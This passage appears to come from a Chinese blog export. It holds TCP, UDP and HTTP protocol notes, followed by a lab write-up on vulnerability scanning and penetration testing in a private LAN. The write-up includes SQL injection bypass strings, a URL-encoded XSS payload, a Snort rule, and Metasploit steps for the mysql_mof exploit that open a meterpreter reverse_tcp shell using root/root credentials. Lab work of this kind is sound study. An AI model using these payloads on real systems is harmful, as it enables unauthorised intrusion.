<li>数据以字节流的形式传输，字节流按段传输。窗口大小决定了在需要接收方确认之前可以发送的数据字节数。</li>
<li>TCP的底层网络层并不是一个可靠服务，它只提供尽最大努力服务。要在一个不可靠的协议上建立一个可靠的协议，<strong>TCP采用了发送-确认机制：即接收方每发送一个报文，就向发送方发送一个确认，发送方只有收到这个报文的确认才认为这次发送才是成功的。</strong></li>
</ol>
</li>
<li><p>TCP报文格式</p>
<ol>
<li><p>TCP封装</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201022120441.png"></p>
</li>
<li><p>TCP头格式</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201022120548.png"></p>
<ol>
<li><strong>源端口号/目标端口号</strong> 标记TCP连接通信双方主机的端口，而双方的IP地址在IP协议的报文首部中已经记录。端口号最大值为65535</li>
<li><strong>32位序号</strong> 发送方报文数据段的起始序号，用于标记每一个发送字节；</li>
<li><strong>32位确认序号</strong> 表示接收方已经成功接收（确认序号-1）的字节。假设B发送给A的TCP报文中，确认需要为700，则表示B已经成功接收了A发送的序号为700之前（不包括700）的所有数据 若确认序号 = N， 则表明：到需要N-1为止的所有数据都已经正确收到</li>
<li><strong>4位首部长度</strong> TCP首部前20位是固定的，<code>选项</code>部分的长度是可选的，但是长度为4N（即4的倍数）。首部长度代表整个报文首部的长度，单位是4字节（32位）。4位首部长度最大值是15，即TCP报文首部最大长度是15 * 4 = 60 个字节，首部可选长度为 60 - 20 = 40 个字节</li>
<li><strong>保留(6位)</strong> 保留今后使用，目前置为0</li>
<li><strong>6个控制位</strong><ol>
<li>URG: 表明该报文段的紧急指针字段有效，它告诉系统此报文段中有紧急数据，紧急指针指明了紧急数据的最后一个字节位于数据段中哪个序号</li>
<li>ACK: 仅当ACK=1时，确认序号字段才生效；当ACK=0时，确认序号字段无效。TCP规定，在连接建立后所有传送的TCP报文段都必须把ACK置为1</li>
<li>PSH: TCP接收方收到PSH=1的报文段时，会尽快的交付到给应用程序处理，而不需要等待整个接收缓存都填满了再向上交付</li>
<li>RST: 当RST=1时，表明TCP连接出现严重差错，必须断开后重新建立连接，同时可以用于拒绝一个非法报文或拒绝打开一个连接</li>
<li>SYN:SYN置为1时，表示这是一个连接请求或接受连接报文；</li>
<li>FIN:用于释放一个连接，当FIN为1时，表示发送方的数据已经发送完毕，并要求释放连接</li>
</ol>
</li>
<li><strong>16位窗口大小</strong> 接收窗口，窗口值告诉对方，当前报文确认序号算起，接收方允许发送的数据量 接收窗口值是发送发设置其发送窗口的依据，且该值是动态变化的</li>
<li><strong>16位校验和</strong> 当接收方接收到一个报文段后，会使用该字段校验整个报文是否完整且正确</li>
<li><strong>16位紧急指针</strong> 与控制位URG搭配使用</li>
<li><strong>选项</strong> 长度可变，最大可达40字节。可以用于存放：<ol>
<li>最大报文长度 MSS （maximum segment size）</li>
<li>窗口扩大选项：解决高速网络下窗口字段不够用问题</li>
<li>时间戳戳选项：用于计算往返时间和防止序号绕回</li>
</ol>
</li>
<li><strong>数据</strong> 存放要发送的报文数据</li>
</ol>
</li>
</ol>
</li>
</ol>
<h3 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h3><p>User Data Protocol，用户数据包协议</p>
<ol>
<li><p>介绍</p>
<p>UDP（用户数据报协议）是一个简单的面向数据报的传输层协议。提供的是非面向连接的、不可靠的数据流传输。UDP不提供可靠性，也不提供报文到达确认、排序以及流量控制等功能。它只是把应用程序传给IP层的数据报发送出去，但是并不能保证它们能到达目的地。因此报文可能会丢失、重复以及乱序等。但由于UDP在传输数据报前不用在客户和服务器之间建立一个连接，且没有超时重发等机制，故而传输速度很快。DNS解析使用UDP协议</p>
</li>
<li><p>UDP报文格式</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201022121405.png"></p>
<ol>
<li>源端口：这个字段占据 UDP 报文头的前 16 位，通常包含发送数据报的应用程序所使用的 UDP 端口。接收端的应用程序利用这个字段的值作为发送响应的目的地址。这个字段是可选的，所以发送端的应用程序不一定会把自己的端口号写入该字段中。如果不写入端口号，则把这个字段设置为 0。这样，接收端的应用程序就不能发送响应了。</li>
<li>目的端口：接收端计算机上 UDP 软件使用的端口，占据 16 位。</li>
<li>长度：该字段占据 16 位，表示 UDP 数据报长度，包含 UDP 报文头和 UDP 数据长度。因为 UDP 报文头长度是 8 个字节，所以这个值最小为 8。</li>
<li>校验值：该字段占据 16 位，可以检验数据在传输过程中是否被损坏。</li>
</ol>
</li>
</ol>
<h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>Hyper Text Transfer Protocol，超文本传输协议</p>
<p>HTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。</p>
<p>HTTP是一个属于应用层的面向对象的协议，由于其简捷、快速的方式，适用于分布式超媒体信息系统。它于1990年提出，经过几年的使用与发展，得到不断地完善和扩展。目前在WWW中使用的是HTTP/1.0的第六版，HTTP/1.1的规范化工作正在进行之中，而且HTTP-NG(Next Generation of HTTP)的建议已经提出。</p>
<p>HTTP协议工作于客户端-服务端架构为上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。Web服务器根据接收到的请求后，向客户端发送响应信息。</p>
<ol>
<li><p>请求报文</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201022124216.png"></p>
</li>
<li><p>响应报文</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201022140408.png"></p>
</li>
<li><p>常用状态码</p>
<table>
<thead>
<tr>
<th align="center">状态码</th>
<th align="center">类比</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1xx</td>
<td align="center">Informational (信息性状态码)</td>
<td align="center">接收的请求正在处理</td>
</tr>
<tr>
<td align="center">2xx</td>
<td align="center">Success( 成功状态码)</td>
<td align="center">请求正常处理完毕</td>
</tr>
<tr>
<td align="center">3xx</td>
<td align="center">Redirection( 重定向状态码)</td>
<td align="center">需要进行附加操作以完成请求</td>
</tr>
<tr>
<td align="center">4xx</td>
<td align="center">Client Error (客户端错误状态码)</td>
<td align="center">服务器无法处理请求</td>
</tr>
<tr>
<td align="center">5xx</td>
<td align="center">Server Error 服务器错误状态码</td>
<td align="center">服务器处理请求出错</td>
</tr>
</tbody></table>
</li>
<li><p>HTTP首部字段</p>
<p>主要分为四种：</p>
<ol>
<li><p>通用首部字段</p>
<p>请求报文和响应报文都可以使用的字段，以下是通用字段表：</p>
<table>
<thead>
<tr>
<th align="center">字段名</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Cache-Control</td>
<td align="center">控制缓存行为</td>
</tr>
<tr>
<td align="center">Connection</td>
<td align="center">逐跳首部、连接的管理</td>
</tr>
<tr>
<td align="center">Date</td>
<td align="center">创建报文的日期时间</td>
</tr>
<tr>
<td align="center">Pragma</td>
<td align="center">报文指令</td>
</tr>
<tr>
<td align="center">Trailer</td>
<td align="center">报文末端的首部一览</td>
</tr>
<tr>
<td align="center">Transfer-Encoding</td>
<td align="center">指定报文主体的传输编码方式</td>
</tr>
<tr>
<td align="center">Upgrade</td>
<td align="center">升级为其他协议</td>
</tr>
<tr>
<td align="center">Warning</td>
<td align="center">错误通知</td>
</tr>
<tr>
<td align="center">Via</td>
<td align="center">代理服务器的相关信息</td>
</tr>
</tbody></table>
</li>
<li><p>请求首部字段</p>
<p>请求报文可以使用的字段，以下是请求报文字段表：</p>
<table>
<thead>
<tr>
<th align="center">字段名</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Accept</td>
<td align="center">用户代理可处理的媒体类型</td>
</tr>
<tr>
<td align="center">Accept-Charset</td>
<td align="center">优先的字符集</td>
</tr>
<tr>
<td align="center">Accept-Encoding</td>
<td align="center">优先的内容编码</td>
</tr>
<tr>
<td align="center">Accept-Language</td>
<td align="center">优先的语言(自然语言)</td>
</tr>
<tr>
<td align="center">Authorizabon</td>
<td align="center">Web认证信息</td>
</tr>
<tr>
<td align="center">Expect</td>
<td align="center">期待服务器的特定行为</td>
</tr>
<tr>
<td align="center">From</td>
<td align="center">用户的电子邮箱地址</td>
</tr>
<tr>
<td align="center">Host</td>
<td align="center">请求资源所在服务器</td>
</tr>
<tr>
<td align="center">If-Match</td>
<td align="center">比较实体标记(ETag )</td>
</tr>
<tr>
<td align="center">If-Modified-Since</td>
<td align="center">比较资源的更新时间</td>
</tr>
<tr>
<td align="center">If-None-Match</td>
<td align="center">比较实体标记(与If-Match相反 )</td>
</tr>
<tr>
<td align="center">lf-Range</td>
<td align="center">资源未更新时发送实体Byte的范围请求</td>
</tr>
<tr>
<td align="center">If-Unmodified-Since</td>
<td align="center">比较资源的更新时间( 与If-Modified-Since 相反I</td>
</tr>
<tr>
<td align="center">Max-Forwards</td>
<td align="center">最大传输逐跳数</td>
</tr>
<tr>
<td align="center">Proxy-Authorization</td>
<td align="center">代理服务器要求客户端的认证信息</td>
</tr>
<tr>
<td align="center">Range</td>
<td align="center">实体的字节范围请求</td>
</tr>
<tr>
<td align="center">Referer</td>
<td align="center">对请求中URl的原始获取方</td>
</tr>
<tr>
<td align="center">TE</td>
<td align="center">传输编码的优先级</td>
</tr>
<tr>
<td align="center">User-Agent</td>
<td align="center">HTTP客户端程序的信息</td>
</tr>
</tbody></table>
</li>
<li><p>响应首部字段</p>
<p>响应报文可以使用的字段，以下是响应报文字段表：</p>
<table>
<thead>
<tr>
<th align="center">字段名</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Accept-Ranges</td>
<td align="center">是否接受字节范围请求</td>
</tr>
<tr>
<td align="center">Age</td>
<td align="center">推算资源创建经过时间</td>
</tr>
<tr>
<td align="center">ETag</td>
<td align="center">资源的匹配信息</td>
</tr>
<tr>
<td align="center">Location</td>
<td align="center">令客户端重定向至指定URI</td>
</tr>
<tr>
<td align="center">Proxy-Authenticate</td>
<td align="center">代理服务器对客户端的认证信息</td>
</tr>
<tr>
<td align="center">Retry-After</td>
<td align="center">对再次发起请求的时机要求</td>
</tr>
<tr>
<td align="center">Server</td>
<td align="center">HTTP服务器的安装信息</td>
</tr>
<tr>
<td align="center">Vary</td>
<td align="center">代理服务器缓存的管理信息</td>
</tr>
<tr>
<td align="center">WWW-Authenticate</td>
<td align="center">服务器对客户端的认证信息**</td>
</tr>
</tbody></table>
</li>
<li><p>实体首部字段</p>
<p>针对请求报文和响应报文的实体部分使用的首部，主要是补充了实体资源相关信息，以下是实体首部字段表：</p>
<table>
<thead>
<tr>
<th align="center">字段名</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Allow</td>
<td align="center">资源可支持的HTTP方法</td>
</tr>
<tr>
<td align="center">Content-Encoding</td>
<td align="center">实体主体适用的编码方式</td>
</tr>
<tr>
<td align="center">Content-Language</td>
<td align="center">实体主体的自然语言</td>
</tr>
<tr>
<td align="center">Content-Length</td>
<td align="center">实体主体的大小(单位字节)</td>
</tr>
<tr>
<td align="center">Content-Location</td>
<td align="center">替代对应资源的URI</td>
</tr>
<tr>
<td align="center">Content-MD5</td>
<td align="center">实体主体的报文摘要</td>
</tr>
<tr>
<td align="center">Content-Range</td>
<td align="center">实体主体的位置范围</td>
</tr>
<tr>
<td align="center">Content-Type</td>
<td align="center">实体主体的媒体类型</td>
</tr>
<tr>
<td align="center">Expires</td>
<td align="center">实体主体过期的日期时间</td>
</tr>
<tr>
<td align="center">Last-Modified</td>
<td align="center">资源的最后修改日期时间</td>
</tr>
</tbody></table>
</li>
</ol>
</li>
</ol>
<p><strong>未完，抽时间再继续写</strong></p>
<h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><h3 id="TFTP"><a href="#TFTP" class="headerlink" title="TFTP"></a>TFTP</h3><h3 id="TELNET"><a href="#TELNET" class="headerlink" title="TELNET"></a>TELNET</h3><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><h3 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h3><h3 id="POP3"><a href="#POP3" class="headerlink" title="POP3"></a>POP3</h3><h3 id="IAMP"><a href="#IAMP" class="headerlink" title="IAMP"></a>IAMP</h3><h3 id="SNMP"><a href="#SNMP" class="headerlink" title="SNMP"></a>SNMP</h3><h3 id="SSL"><a href="#SSL" class="headerlink" title="SSL"></a>SSL</h3><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://www.jianshu.com/p/90abebfe0014">https://www.jianshu.com/p/90abebfe0014</a></li>
<li><a href="https://www.jianshu.com/p/4bd8758f9fbd">https://www.jianshu.com/p/4bd8758f9fbd</a></li>
<li><a href="https://blog.csdn.net/tigerjibo/article/details/7356936">https://blog.csdn.net/tigerjibo/article/details/7356936</a></li>
<li><a href="https://segmentfault.com/a/1190000023255475">https://segmentfault.com/a/1190000023255475</a></li>
<li><a href="https://juejin.im/post/6844904033354776584">https://juejin.im/post/6844904033354776584</a></li>
<li><a href="http://c.biancheng.net/view/6440.html">http://c.biancheng.net/view/6440.html</a></li>
<li><a href="https://www.jianshu.com/p/80e25cb1d81a">https://www.jianshu.com/p/80e25cb1d81a</a></li>
<li><a href="https://www.jianshu.com/p/f5b3324b961f">https://www.jianshu.com/p/f5b3324b961f</a></li>
</ul>
]]></content>
      <categories>
        <category>protocol</category>
      </categories>
      <tags>
        <tag>TCP</tag>
        <tag>UDP</tag>
        <tag>IP</tag>
        <tag>ICMP</tag>
        <tag>RAP</tag>
      </tags>
  </entry>
  <entry>
    <title>网络扫描实验</title>
    <url>/%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E5%AE%9E%E9%AA%8C.html</url>
    <content><![CDATA[<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><ol>
<li>了解网站<code>Sql注入漏洞</code>、<code>XSS漏洞</code>原理，通过<code>AWVS</code>软件对目标网站进行漏洞扫描实验，分析<code>Sql注入漏洞</code>和<code>XSS漏洞</code>扫描的原理及结果。</li>
<li>用<code>xscan</code>或<code>nessus</code>软件进行主机、端口、漏洞扫描实验，捕获扫描时交互的数据包，通过分析扫描数据包，验证扫描原理。</li>
<li>在<code>Windows</code>或<code>Linux</code>平台搭建<code>Snort IDS</code>，自己编写检测规则文件，对<code>xscan</code>或<code>nessus</code>软件网络扫描进行检测。</li>
<li>了解<code>Metasploit Framework</code>渗透测试工具，对<code>mysql数据库漏洞</code>进行渗透测试。<span id="more"></span></li>
</ol>
<h1 id="AWVS扫描漏洞"><a href="#AWVS扫描漏洞" class="headerlink" title="AWVS扫描漏洞"></a>AWVS扫描漏洞</h1><p>通过AWVS软件对目标网站进行漏洞扫描实验，分析Sql注入漏洞和XSS漏洞扫描的原理及结果。</p>
<ol>
<li><p>自己搭建SQL注入攻击漏洞网站：<code>http://10.122.251.244/SQL/</code>(已无法访问)并使用AWVS进行扫描。查看扫描结果，发现网站存在SQL注入漏洞。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565689438814.png" alt="1565689438814"></p>
</li>
<li><p>分析SQL注入漏洞，当在输入框中输入<code>1&#39; OR 3*2*1=6 AND 000429=000429--</code>以绕过检测，直接登录。将输入的语句放在php语句中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql=&quot;select* from users where username=&#x27;1&#x27; OR 3*2*1=6 AND</span><br><span class="line">000429=000429 **--**&#x27; and password=&#x27;$pwd&#x27;&quot;;</span><br></pre></td></tr></table></figure>

<p> 该语句恒为true，故可以绕过验证直接登录。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565689649032.png" alt="1565689649032"></p>
</li>
<li><p>尝试在URL输入栏中输入：</p>
<p><code>http://10.122.251.244/sql/test.php?password=g00dPa%24%24w0rD&amp;username=-1&#39;%20OR%203*2*1%3d6%20AND%20000567%3d000567%20--%20</code> , 可以绕验证登录成功，同时说明了SQL注入攻击是通过输入改变后台SQL语句内容达到攻击目标数据库的目的。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565689780827.png" alt="1565689780827"></p>
</li>
<li><p>自己搭建xss漏洞网站：<code>http://10.122.251.244/XSS/</code>(已无法访问)并使用AWVS进行扫描。查看扫描结果，发现网站存在XSS漏洞。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565689840077.png" alt="1565689840077"></p>
</li>
<li><p>发现网页的输入框存在<code>跨站脚本攻击</code>，点击右侧的<code>view HTML response</code>，弹出对话框，攻击成功。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565689894657.png" alt="1565689894657"></p>
</li>
<li><p>按照说明点击<code>launch the attack with http editor</code>，发送报文，未弹出对话框，但是网页内容得到更改。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565689953549.png" alt="1565689953549"></p>
</li>
<li><p>在浏览器的URL栏输入内容如下<code>http://10.122.251.244//xss/index.php?input=1&#39;%22()%26%25prompt(“xss”)prompt(“xss”)&lt;/ScRiPt)&gt;</code>，成功弹出对话框，xss攻击成功。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565690032102.png" alt="1565690032102"></p>
</li>
<li><p>xss攻击原理是通过对网页注入可执行代码且成功地被浏览器执行，达到攻击的目的，而上面的攻击就是通过一个get请求输入一串可执行的script代码且成功被执行：输入的代码可执行代码是<code>&lt;ScRiPt%20&gt;prompt(&quot;XSS&quot;)&lt;/ScRiPt&gt;</code>,即执行弹出框，内容是xss。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565690254180.png" alt="1565690254180"></p>
</li>
</ol>
<h1 id="x-Scan漏洞扫描"><a href="#x-Scan漏洞扫描" class="headerlink" title="x-Scan漏洞扫描"></a>x-Scan漏洞扫描</h1><p>用x-Scan软件进行主机、端口、漏洞扫描。</p>
<ol>
<li><p>x-Scan软件扫描漏洞原理</p>
<ol>
<li>首先对主机进行端口扫描，确定系统开放的端口；</li>
<li>然后对开放的端口进行网络服务类型的识别，确定其提供的网络服务;</li>
<li>根据目标提供的网络服务，调用漏洞资料库中已知的各种漏洞进行逐一检测，通过对探测响应数据包的分析判断是否存在已知安全漏洞。</li>
</ol>
</li>
<li><p>在<code>windows7虚拟机</code>内运行<code>X-Scan</code>，并配置检测IP地址：<code>192.168.88.132</code>。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565690455956.png" alt="1565690455956"></p>
</li>
<li><p>配置扫描模块：漏洞检测脚本。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565690493036.png" alt="1565690493036"></p>
</li>
<li><p>扫描端口范围设置为1-65536，检测方式选择默认TCP。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565690527344.png" alt="1565690527344"></p>
</li>
<li><p>进行扫描。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565690553808.png" alt="1565690553808"></p>
</li>
<li><p>扫描完成，网页显示出被检测主机的详细漏洞信息，并给出了安全漏洞的详细信息及解决方案。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565690585737.png" alt="1565690585737"></p>
</li>
<li><p>扫描过程中使用Wireshark进行抓包。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565690617576.png" alt="1565690617576"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565690636729.png" alt="1565690636729"></p>
</li>
<li><p>分析wireshark捕获的数据包，发现扫描器先与目标主机在不同的端口建立不同的TCP连接，然后根据端口提供的网络服务类型调用漏洞资料库中已知的各种漏洞进行逐一检测，通过对探测响应数据包的分析判断是否存在已知安全漏洞。例如在扫描135端口时先在135端口上建立TCP连接，然后发送不同类型的协议请求(如DCERPC协议、EPM协议)来检测漏洞。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565690674299.png" alt="1565690674299"></p>
</li>
</ol>
<h1 id="搭建Snort-IDS"><a href="#搭建Snort-IDS" class="headerlink" title="搭建Snort IDS"></a>搭建Snort IDS</h1><ol>
<li><p>IDS简介：</p>
<p>​        <code>入侵检测系统（Intrusion Detection System,IDS）</code>的作用是<strong>监控网络和计算机系统是否出现被入侵或滥用的征兆。</strong>IDS系统不需要人工干预就可以不间断的地运行，能够发现异于正常的行为的操作。</p>
</li>
<li><p>实验环境：<br>服务平台：<code>windows 2003</code> (安装Snort)(<code>192.168.88.143</code>)<br>攻击平台：<code>windows 7</code> (测试snort)(<code>192.168.88.145</code>)<br>软件版本：   <code>snort2.8.0.2</code>、<code>apache2.2.8</code>、<code>php5.2</code>、<code>mysql5.0</code>、<code>winpcap4.0.2</code>、<code>acid0.9</code>、<code>adodb5</code>、<code>jpgraph2.3</code></p>
</li>
<li><p>在windows 2003上搭建Snort环境完成后，在目录：<code>C:\ids\Snort\bin</code>下打开命令行，输入<code>snort -W</code>，出现如下图案，说明snort安装成功。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565690887062.png" alt="1565690887062"></p>
</li>
<li><p>在目录文件<code>C:\ids\Snort\rules\local.rules</code>上添加一个规则：<code>alert icmp any any -&gt; $HOME_NET any (msg:&quot;icmp Packet&quot;;sid:1234567890;rev:1;)</code>，捕获任意主机发送到该主机的<code>ICMP</code>包。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565690945779.png" alt="1565690945779"></p>
</li>
<li><p>在目录：<code>C:\ids\Snort\bin</code>下打开命令行，输入<code>snort -i2 -l c:\ids\snort\log\ -c c:\ids\snort\etc\snort.conf -dev -p</code>，运行snort。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565690993993.png" alt="1565690993993"></p>
</li>
<li><p>Windows7主机对windows xp主机进行ping命令测试。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691019631.png" alt="1565691019631"></p>
</li>
<li><p>在windows 2003上打开网页：<code>http://localhost/acid/acid_main.php</code>，检测到ICMP包，分析为<code>192.168.88.145</code>，发送至<code>192.168.143</code>。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691068262.png" alt="1565691068262"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691085455.png" alt="1565691085455"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691111110.png" alt="1565691111110"></p>
</li>
<li><p>由于使用snort规则不熟练简单写了嗅探<code>TCP</code>、<code>UDP</code>、<code>ICMP</code>的规则，嗅探来自任何主机发送至该主机的数据包。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691163321.png" alt="1565691163321"></p>
</li>
<li><p>使用windows7对windows 2003进行X-scan扫描，同时开启snort扫描，X-scan扫描结果如下。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691191082.png" alt="1565691191082"></p>
</li>
<li><p>Snort嗅探结果如下，可以看出X-scan发出的基本上是<code>TCP包</code>。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691229389.png" alt="1565691229389"></p>
</li>
<li><p>截取捕获的部分TCP包如下，可以看出检测端口非常多。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691265544.png" alt="1565691265544"></p>
</li>
<li><p>点击一个TCP包，具体信息如下，从<code>192.168.88.143</code>的<code>292</code>端口发送至<code>192.168.88.145</code>的<code>51097</code>端口。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691312746.png" alt="1565691312746"></p>
</li>
<li><p>查看源IP地址如下，其中<code>192.168.88.1</code>是这次检测发送的源地址，<code>192.149.252.21</code>描述的是<code>gm2.arin.net</code>，不知道为什么会出现这个地址。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691362079.png" alt="1565691362079"></p>
</li>
<li><p>源端口有<code>4695</code>个，其中UDP端口<code>2</code>个，目的端口有<code>3379</code>个，其中UDP端口<code>2</code>个，基本上使用的是TCP端口。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691387127.png" alt="1565691387127"></p>
</li>
</ol>
<h1 id="mysql数据库漏洞渗透"><a href="#mysql数据库漏洞渗透" class="headerlink" title="mysql数据库漏洞渗透"></a>mysql数据库漏洞渗透</h1><p>了解Metasploit Framework渗透测试工具，对mysql数据库漏洞进行渗透测试。</p>
<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><ul>
<li>攻击机：Kali linux（攻击机和靶机位于同一局域网下）</li>
<li>靶机：windows xp (安装<code>mysql5.5.19</code>)</li>
<li>工具：<code>Metaspolit</code>：<code>Metaspolit</code>是一款开源的安全漏洞检测工具，其集成了各种平台上常见的溢出漏洞和流行的shellcode，并不断提供更新。</li>
</ul>
<h2 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h2><p><code>mysql 5.5.19</code>版本存在的<code>CVE-2012-5613</code>权限提升漏洞</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>利用<code>metaspolit</code>辅助模块<code>auxiliary</code>，对目标进行信息收集。</p>
<ol>
<li><p>输入<code>msfconsole</code>，运行<code>metaspolit</code>。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691796739.png" alt="1565691796739"></p>
</li>
<li><p>输入<code>show auxiliary</code>，查看所有辅助模块。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691835467.png" alt="1565691835467"></p>
</li>
<li><p>使用辅助模块：<code>MySQL Server Version Enumeration</code>，查看靶机的mysql版本信息。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691867189.png" alt="1565691867189"></p>
</li>
<li><p>输入命令：<code>use auxiliary/scanner/mysql/mysql_version</code>，调用<code>MySQL Server Version Enumeration</code>模块，输入命令<code>show options</code>，展示设置项。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691923481.png" alt="1565691923481"></p>
</li>
<li><p>端口为<code>3306</code>，线程为<code>1</code>，数据库连接端口，没有目标主机IP，设置扫描<code>192.168.88.2-254</code>，并再次显示设置项，设置成功。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691970562.png" alt="1565691970562"></p>
</li>
<li><p>输入命令<code>exploit</code>，进行扫描。扫描结束后，发现IP地址为<code>192.168.88.128</code>的主机上的mysql版本为<code>5.5.19</code>，存在<code>CVE-2012-5613</code>漏洞。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565692007318.png" alt="1565692007318"></p>
</li>
</ol>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol>
<li><p>退回到<code>msf</code>，输入<code>search mysql</code>，检索<code>metaspolit</code>中集成的有关mysql的模块。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565692097710.png" alt="1565692097710"></p>
</li>
<li><p>选择<code>exploit/windows/mysql/mysql_mof</code>对目标主机进行本地提权，输入命令<code>use exploit/windows/mysql/mysql_mof</code>使用该模块，输入命令<code>show options</code>，展示设置项。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565692150667.png" alt="1565692150667"></p>
</li>
<li><p>发现用户名、密码、IP地址都没有输入，利用命令<code>set</code>输入用户名<code>root</code>，密码<code>root</code>，IP地址:<code>192.168.88.128</code>。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565692208251.png" alt="1565692208251"></p>
</li>
<li><p>选择加载模块<code>payloads</code>, 输入命令<code>show payloads</code>，查看<code>metaspolit</code>集成的加载模块。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565692245049.png" alt="1565692245049"></p>
</li>
<li><p>选择加载模块<code>windows/meterpreter/reverse_tcp</code>，输入命令：<code>set payload</code><br><code>windows/meterpreter/reverse_tcp</code>，输入命令<code>show options</code>，展示设置项，监听端口为<code>4444</code>。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565692329433.png" alt="1565692329433"></p>
</li>
<li><p>未设置监听地址<code>LHOST</code>，利用命令<code>set</code>设置监听地址为攻击机IP：<code>192.168.88.130</code>。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565692388669.png" alt="1565692388669"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565692402487.png" alt="1565692402487"></p>
</li>
<li><p>输入<code>exploit</code>进行攻击,连接成功，开始使用<code>meterpreter</code>工具。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565692436217.png" alt="1565692436217"></p>
</li>
